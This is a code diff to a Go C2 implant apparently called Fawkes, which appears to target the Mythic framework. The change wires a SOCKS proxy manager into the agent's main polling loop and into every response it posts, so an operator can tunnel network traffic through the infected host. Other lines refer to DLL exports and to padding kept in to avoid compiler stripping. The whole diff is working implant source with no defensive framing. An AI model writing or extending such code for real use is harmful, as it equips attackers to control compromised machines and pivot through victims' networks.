@@ -19,6 +19,7 @@ import (
 	"fawkes/pkg/files"
 	"fawkes/pkg/http"
 	"fawkes/pkg/profiles"
+	"fawkes/pkg/socks"
 	"fawkes/pkg/structs"
 )
 
@@ -140,14 +141,17 @@ func runAgent() {
 		cancel()
 	}()
 
+	// Initialize SOCKS proxy manager
+	socksManager := socks.NewManager()
+
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, maxRetriesInt, sleepIntervalInt, debugBool)
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sleepIntervalInt, debugBool)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, maxRetriesInt int, sleepIntervalInt int, debugBool bool) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sleepIntervalInt int, debugBool bool) {
 	// Main execution loop
 	retryCount := 0
 	for {
@@ -159,8 +163,11 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 			if debugBool {
 				// log.Printf(\"[DEBUG] Main loop iteration (retry count: %d)\", retryCount)
 			}
-			// Get tasks from C2 server
-			tasks, err := c2.GetTasking(agent)
+			// Drain any pending outbound SOCKS data to include in this poll
+			outboundSocks := socksManager.DrainOutbound()
+
+			// Get tasks and inbound SOCKS data from C2 server
+			tasks, inboundSocks, err := c2.GetTasking(agent, outboundSocks)
 			if err != nil {
 				log.Printf("[ERROR] Failed to get tasking: %v", err)
 				retryCount++
@@ -190,9 +197,14 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 				// log.Printf("[DEBUG] GetTasking successful, received %d tasks", len(tasks))
 			}
 
+			// Pass inbound SOCKS messages to the manager for processing
+			if len(inboundSocks) > 0 {
+				socksManager.HandleMessages(inboundSocks)
+			}
+
 			// Process tasks
 			for _, task := range tasks {
-				processTaskWithAgent(task, agent, c2)
+				processTaskWithAgent(task, agent, c2, socksManager)
 			}
 
 			// Sleep before next iteration
@@ -205,7 +217,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 	}
 }
 
-func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile) {
+func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager) {
 	log.Printf("[INFO] Processing task: %s (ID: %s)", task.Command, task.ID)
 
 	// Create Job struct with channels for this task
@@ -224,7 +236,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 		for {
 			select {
 			case resp := <-job.SendResponses:
-				mythicResp, err := c2.PostResponse(resp, agent)
+				mythicResp, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
 				if err != nil {
 					log.Printf("[ERROR] Failed to post file transfer response: %v", err)
 					continue
@@ -256,7 +268,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 				for {
 					select {
 					case resp := <-job.SendResponses:
-						_, err := c2.PostResponse(resp, agent)
+						_, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
 						if err != nil {
 							log.Printf("[ERROR] Failed to post file transfer response: %v", err)
 						}
@@ -277,7 +289,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 			UserOutput: fmt.Sprintf("Unknown command: %s", task.Command),
 			Completed:  true,
 		}
-		if _, err := c2.PostResponse(response, agent); err != nil {
+		if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
 			log.Printf("[ERROR] Failed to post response: %v", err)
 		}
 		close(done)
@@ -299,7 +311,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 		Status:     result.Status,
 		Completed:  result.Completed,
 	}
-	if _, err := c2.PostResponse(response, agent); err != nil {
+	if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
 		log.Printf("[ERROR] Failed to post response: %v", err)
 	}
 
